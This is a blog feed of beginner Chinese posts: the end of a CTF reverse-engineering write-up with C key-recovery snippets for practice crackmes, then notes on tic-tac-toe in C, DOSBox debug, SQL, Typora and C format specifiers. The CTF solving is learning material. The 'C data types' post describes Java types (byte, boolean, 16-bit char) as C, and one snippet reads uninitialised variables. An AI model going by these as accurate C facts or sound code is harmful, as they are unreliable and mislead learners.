<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> n; </span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> x;x&lt;<span class="number">10</span>;x++)&#123;               <span class="comment">//实际上不用输出这么多次</span></span><br><span class="line">	i = <span class="number">17</span>*n+<span class="number">8</span> ;                         <span class="comment">//看wp别人都是直接取25不写这段代码的</span></span><br><span class="line">	<span class="keyword">if</span>(i%<span class="number">5</span>!=<span class="number">3</span>)</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,i);          </span><br><span class="line">	n++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;                              </span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<ol start="3">
<li>最后一个，strcmp()函数，相等是返回0，为假，可以阻止if触发，所以argv[3]=”h4cky0u”</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> first = <span class="number">0xcafe</span>;</span><br><span class="line">    <span class="keyword">int</span> second = <span class="number">25</span>;</span><br><span class="line">    argv[<span class="number">3</span>] = <span class="string">&quot;h4cky0u&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> hash = first * <span class="number">31337</span> + (second % <span class="number">17</span>) * <span class="number">11</span> + <span class="built_in">strlen</span>(argv[<span class="number">3</span>]) - <span class="number">1615810207</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Get your key: &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, hash);</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出   Get your key: c0ffee 结束。</p>
<hr>
<h3 id="五、simple-unpack"><a href="#五、simple-unpack" class="headerlink" title="五、simple-unpack"></a>五、simple-unpack</h3><p><del>这题也可以直接用笔记本打开</del></p>
<p>当然正经解法还是按题目说的，脱壳，然后ida打开，可以直接找到flag</p>
<hr>
<h3 id="六、logmein"><a href="#六、logmein" class="headerlink" title="六、logmein"></a>六、logmein</h3><p>这题好多变量，储存方式好多，不过抄一下算法，把报错的BYTE根据百度查到的改成char，结束</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__int64 v7 = <span class="number">28537194573619560LL</span>;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">char</span> v8[]=<span class="string">&quot;:\&quot;AL_RT^L*.?+6/46&quot;</span>;</span><br><span class="line">        </span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">17</span>; ++i)       </span><br><span class="line">	   <span class="built_in">putchar</span>(*((<span class="keyword">char</span> *)&amp;v7 + i % <span class="number">7</span>) ^ v8[i]);</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"> &#125; </span><br></pre></td></tr></table></figure>



<p>试着分析一下</p>
<p>绕过所有if可以得到sub_4007F0,  双击查看<img src="https://i.loli.net/2021/09/23/lZPk3dv1HqujGfK.png" alt="8.png"></p>
<p>绕过所有if的输入值，就是正确密码，所以</p>
<p>s[i] = (char)(*((_BYTE *)&amp;v7 + i % v6) ^ v8[i])</p>
<p>v7是个数组 v6=7 v8是内容为:&quot;AL_RT^L*.?+6/46的数组</p>
<p>看wp，知道了_int64一般为小端存储，反序存储，虽然这题抄一下算法就能得解，但是算是解决了上面那题<strong>re1</strong>的疑惑。</p>
<hr>
<ul>
<li>其实还尝试了一下别的方向的新手题，但是感觉能被我做出来，那确实没什么好记录的</li>
<li>wp里好多使用python写解题脚本，但是我 目前不会</li>
</ul>
<p><img src="https://i.loli.net/2021/09/23/E3g79JfIoXWLp1A.jpg" alt="1.jpg"></p>
]]></content>
      <tags>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>尝试用c做一个简单的井字棋</title>
    <url>/2021/09/23/%E5%B0%9D%E8%AF%95%E7%94%A8c%E5%81%9A%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E4%BA%95%E5%AD%97%E6%A3%8B/</url>
    <content><![CDATA[<h1 id="试着记录一下尝试使用c语言堆一个井字棋的过程"><a href="#试着记录一下尝试使用c语言堆一个井字棋的过程" class="headerlink" title="试着记录一下尝试使用c语言堆一个井字棋的过程"></a>试着记录一下尝试使用c语言堆一个井字棋的过程</h1><p> 编程语言还是得实操才能熟练，于是试着弄个井字棋，甚至本来想让程序永远不会输，顶多平局，可惜能力不足，这种东西归纳不动，列举又不想都列出来，索性先试着造出基础点的东西。</p>
  <span id="more"></span> 

<p>用代码堆一个井字棋，那确实还是输入，计算，输出</p>
<hr>
<h4 id="一、输入"><a href="#一、输入" class="headerlink" title="一、输入"></a>一、输入</h4><p>​     重要的就9个格子，完全可以用数组存储，将输入直接赋值给数组里的元素就行。</p>
<p>输入时，如果数组元素不为0，报错，并提示换个地方下。</p>
<h4 id="二、计算"><a href="#二、计算" class="headerlink" title="二、计算"></a>二、计算</h4><p>​        首先，需要随机决定先后手，我使用rand()随机生成一个数然后和2求余，只会有0、1两种结果。</p>
<p>不过，只用rand()就只会在第一次计算是生成一个数，后面再怎么运行也都是这数了，这好像不太随机，不大行。</p>
<p>​        于是我用了srand函数，原型:void srand(unsigned seed)</p>
<p>把它的参数设成系统时间，变化的参数使每次随机数都是重新生成的，从而达到随机的目的。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">srand((<span class="keyword">unsigned</span>)time(<span class="literal">NULL</span>));</span><br><span class="line"><span class="keyword">int</span> first= rand()%<span class="number">2</span>;  <span class="comment">//然后根据first是1还是0，决定先后手</span></span><br></pre></td></tr></table></figure>

<p>​        还有一个自定义函数，大概思路是检测数组里，对应位置是1还是2，然后转换成对应坐标的O和X输出，为什么这里不用0和1呢，因为还有空着的情况，所以就直接采用0，1，2了</p>
<p>​        检测函数的整体代码就不放这了，对我这个初学者，不好用while循环简化，太长了，并且格式不是很好看，能动起来就挺不容易的。</p>
<p>​        还需要一个判断胜利，或者平局的条件，我是用对应数组相等，来判断的。</p>
<p>比如，程序下的棋使用存入1，玩家写入2，当一行都为1或2时，判断某方胜利。</p>
<p>如果9回合后没有哪方胜利，即平局</p>
<h4 id="三、输出"><a href="#三、输出" class="headerlink" title="三、输出"></a>三、输出</h4><p>​        在特定位置输出，书上确实没有，但是可以查到，并且顺便用上了同一个头文件的换颜色。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//自定义的光标定位函数</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setCursorPosition</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    COORD coord;</span><br><span class="line">    coord.X = x;</span><br><span class="line">    coord.Y = y;</span><br><span class="line">    SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), coord);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//自定义的文字颜色函数</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setColor</span><span class="params">(<span class="keyword">int</span> color)</span></span>&#123;</span><br><span class="line">    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), color) ;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>





<hr>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
<li><p>如果没有去实际操作，有些不理解的地方是肯定不会发现的（比如我在这之前不知道数组名称不配当某些自定义函数的参数）。</p>
</li>
<li><p>遇到问题，首先在备份后，尝试自己修改解决，还是不行，就试着描述问题，想想别人提问，或是别人总结这一问题时，会使用哪些关键词，然后看看别人怎么解决。</p>
</li>
<li><p>还有就是因为Sleep（）函数，我再次加深了，c语言函数需要区分好    <strong>大小写</strong></p>
</li>
</ul>
]]></content>
      <tags>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title>非常非常初学的汇编dosbox基础指令基础用法</title>
    <url>/2021/09/21/%E9%9D%9E%E5%B8%B8%E9%9D%9E%E5%B8%B8%E5%88%9D%E5%AD%A6%E7%9A%84%E6%B1%87%E7%BC%96dosbox%E5%9F%BA%E7%A1%80%E6%8C%87%E4%BB%A4%E5%9F%BA%E7%A1%80%E7%94%A8%E6%B3%95/</url>
    <content><![CDATA[<h1 id="这大概就是汇编的基础增删改查吧"><a href="#这大概就是汇编的基础增删改查吧" class="headerlink" title="这大概就是汇编的基础增删改查吧"></a>这大概就是汇编的基础增删改查吧</h1><p>稍微整理了一下，理解了一下看到的基础用法</p>
<span id="more"></span> 

<p><strong>R指令 查看修改寄存器</strong></p>
<p>​      -r 查看<br>​      -r ax,2000 把ax改成2000</p>
<p><strong>D指令 查看内存</strong><br>      -d cs:ip 看看处于这个位置的内存里写了什么<br><strong>E指令 往内存里写东西</strong><br>     -e cs:ip 从这个地址开始写东西<br>     -e cs:ip 1 2 3 4 把01 02 03 04往内存写<br>     -e cs:ip ‘a’ 把a这个字符对应的ASCII码写入内存<br>     -e cs:ip b8 01 00 把这个往内存写，相当于也写入了对应的汇编指令 mov ax,0001<br><strong>U指令 解释内存中的机械指令和对应的汇编</strong><br>     -u cs:ip 从这个地址开始解释<br><strong>A指令 以汇编的形式写入指令</strong><br>      -a cs:ip mov ax,3<br><strong>T指令 执行命令</strong><br>      -t cs:ip 执行这个位置的命令</p>
]]></content>
      <tags>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>10分钟学点整理点sql常用指令</title>
    <url>/2021/09/21/10%E5%88%86%E9%92%9F%E5%AD%A6%E7%82%B9%E6%95%B4%E7%90%86%E7%82%B9sql%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/</url>
    <content><![CDATA[<h1 id="sql常用基础指令"><a href="#sql常用基础指令" class="headerlink" title="sql常用基础指令"></a>sql常用基础指令</h1><p>随便记记，意会就行，我自己看得懂就行</p>
<span id="more"></span> 
<ul>
<li>增:insert</li>
<li>删:delete</li>
<li>改:update</li>
<li>查:select或者show</li>
<li>alter table 表名 rename to 新表名；改表名</li>
<li>rename table 表名 to 新名；还是改表名</li>
<li>alter table 表名 add 字段名 字段类型        加列，添加多个要加括号，每个字段之间逗号隔开</li>
<li>alter table 表名 change 旧字段名 新字段名 字段类型   改列名</li>
<li>use 库名; 连接，或者说调出一个库</li>
<li>create database 库名字 建个库</li>
<li>show databases 列出所有库</li>
<li>mysqladmin -u root -p create 数据库名  也是建库</li>
<li>use test 调出一个库</li>
<li>select database() 看看当前库</li>
<li>drop database 库名字 删这个库</li>
<li>show columns from 表名  看看表的结构</li>
<li>UPDATE Person SET Address = ‘Zhongshan 23’, City = ‘Nanjing’ WHERE LastName = ‘Wilson’</li>
<li>在lastname这栏为wilson的那行 把address和city改了</li>
<li>select * from 表名    看看这个表</li>
</ul>
]]></content>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>尝试编写博客文章</title>
    <url>/2021/09/18/%E5%B0%9D%E8%AF%95%E7%BC%96%E5%86%99%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0/</url>
    <content><![CDATA[<h1 id="尝试编写博客文章"><a href="#尝试编写博客文章" class="headerlink" title="尝试编写博客文章"></a>尝试编写博客文章</h1><h2 id="—-关于Typora快捷键的些许记录"><a href="#—-关于Typora快捷键的些许记录" class="headerlink" title="—-关于Typora快捷键的些许记录"></a>—-关于Typora快捷键的些许记录</h2><p>标题 Ctrl+1/2/3 整行对应一二三级标题</p>
<p><strong>加粗</strong> Ctrl+B</p>
<p><em>斜体</em> Ctrl+I</p>
<span id="more"></span> 

<p><u>下划线</u> Ctrl+U</p>
<p><del>删除线</del> Alt+Shift+5</p>
<p><code>代码片段</code> Ctrl+Shift+`</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">代码块 Ctrl+Shift+K</span><br></pre></td></tr></table></figure>

<p>跳出代码块 Ctrl+Enter</p>
<p><a href="https://stttrl.github.io/">链接</a> Ctrl+K（先复制链接，然后选中要加链接的文本，按快捷键。Ctrl+左键点击文本可跳转到对应链接）(这里的链接直接返回首页)</p>
<p>取消格式 再次按相同的快捷键</p>
<p>有序列表 数字+点+空格 </p>
<ol>
<li>a</li>
<li></li>
</ol>
<p> 无序列表 减号+空格</p>
<ul>
<li>a</li>
<li></li>
</ul>
<p>任务列表 加号或减号+空格</p>
<p>切换到列表下一行 Space+Enter</p>
<p>嵌套列表 按Tab键</p>
<p>退出列表 按 Shift+Tab</p>
<table>
<thead>
<tr>
<th>插入表格</th>
<th>Ctrl+T</th>
</tr>
</thead>
</table>
<blockquote>
<p>引用 Ctrl+Shift+Q</p>
</blockquote>
]]></content>
      <tags>
        <tag>Typora</tag>
      </tags>
  </entry>
  <entry>
    <title>c语言可能目前常用到的数据类型修饰符等</title>
    <url>/2021/09/17/c%E8%AF%AD%E8%A8%80%E5%8F%AF%E8%83%BD%E7%9B%AE%E5%89%8D%E5%B8%B8%E7%94%A8%E5%88%B0%E7%9A%84%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E4%BF%AE%E9%A5%B0%E7%AC%A6%E7%AD%89/</url>
    <content><![CDATA[<h1 id="C语言大概用的上的数据类型和修饰符等整理"><a href="#C语言大概用的上的数据类型和修饰符等整理" class="headerlink" title="C语言大概用的上的数据类型和修饰符等整理"></a>C语言大概用的上的数据类型和修饰符等整理</h1><p>数据类型</p>
<p><strong>byte</strong></p>
<ul>
<li><p>8位、有符号的以二进制补码表示的整数</p>
</li>
<li><p>min :  -128（-2^7）</p>
</li>
<li><p>max:  127(2^7-1)</p>
<span id="more"></span> </li>
</ul>
<p><strong>short</strong></p>
<ul>
<li>16位、有符号的以二进制补码表示的整数</li>
<li>min :  -32768（-2^15）</li>
<li>max:  32767（2^15 - 1）</li>
</ul>
<p><strong>int</strong></p>
<ul>
<li>32位、有符号的以二进制补码表示的整数</li>
<li>min :  -2,147,483,648（-2^31）</li>
<li>max:  2,147,483,647（2^31 - 1）</li>
</ul>
<p><strong>long</strong></p>
<ul>
<li>64位、有符号的以二进制补码表示的整数</li>
<li>min :  -9,223,372,036,854,775,808（-2^63）</li>
<li>max:  9,223,372,036,854,775,807（2^63 -1）</li>
</ul>
<p><strong>float</strong></p>
<ul>
<li>单精度、32位、符合IEEE 754标准的浮点数</li>
<li>float 在储存大型浮点数组的时候可节省内存空间</li>
<li>浮点数不能用来表示精确的值，如货币</li>
</ul>
<p><strong>double</strong></p>
<ul>
<li>双精度、64位、符合IEEE 754标准的浮点数</li>
<li>浮点数的默认类型为double类型</li>
<li>double类型同样不能表示精确的值，如货币</li>
</ul>
<p><strong>char</strong></p>
<ul>
<li>char类型是一个单一的 16 位 Unicode 字符</li>
<li>最小值是 0</li>
<li>最大值是 65535</li>
<li>char 数据类型可以储存任何字符</li>
</ul>
<p><strong>boolean</strong></p>
<ul>
<li>boolean数据类型表示一位的信息</li>
<li>只有两个取值：true 和 false</li>
<li>这种类型只作为一种标志来记录 true/false 情况</li>
</ul>
<p><strong>prinft和scanf很像，但是修饰符有不一样的地方，所以试着整理</strong></p>
<p>printf()相关 </p>
<p>转化说明</p>
<ul>
<li><p>%a    浮点数、十六进制数和p计数法</p>
</li>
<li><p>%c    单个字符</p>
</li>
<li><p>%d    有符号十进制整数</p>
</li>
<li><p>%e    浮点数、e计数法（小数点左侧一个数字，右侧六个小数）</p>
</li>
<li><p>%f    浮点数，十进制计数法（默认6位小数）</p>
</li>
<li><p>%g    根据值的不同自动选择%f或%e。%e用于指数小于-4或者大于等于精度时。</p>
</li>
<li><p>%i    有符号十进制整数（与%d相同）</p>
</li>
<li><p>%o    无符号八进制整数</p>
</li>
<li><p>%p    指针</p>
</li>
<li><p>%s    字符串</p>
</li>
<li><p>%u    无符号十进制整数</p>
</li>
<li><p>%x    无符号十六进制整数，使用十六进制数0f</p>
</li>
<li><p>%%    打印一个%</p>
</li>
</ul>
<p>修饰符</p>
<ul>
<li>​    -减号       会把项目打印在字段的左侧开始处。例如：“-20s”</li>
<li>​    +加号      使值带正负号</li>
<li>​    空格         正为前导空格，负为-</li>
<li>​    #井号      使用转换说明的对应可选形式</li>
<li>​     0             使用前导0占据字符宽度空格</li>
<li>​     数字           字段宽度最小值</li>
<li>​     h             和整数转换说明一起使用 表short int</li>
<li>​     hh            同上，但是表short char</li>
<li>​     l                表long int </li>
<li>​     ll              表longl long int</li>
</ul>
<hr>
<p>scanf()相关 </p>
<p>转化说明</p>
<ul>
<li>%c 把输入视为字符</li>
<li>%d 把输入视为10进制整数</li>
<li>%e %f %g 把输入视为浮点数</li>
<li>%i 把输入视为带符号的10进制整数</li>
<li>%o 把输入视为带符号的8进制整数</li>
<li>%x 把输入视为带符号的16进制整数</li>
<li>%u 把输入视为无符号10进制整数</li>
<li>%p 把输入视为指针</li>
</ul>
<p>修饰符</p>
<p>​    *                跳过赋值</p>
<p>数字              读取的最大宽度 如%10d 读到第10位或是空白时停止</p>
]]></content>
      <tags>
        <tag>c</tag>
      </tags>
  </entry>
</search>
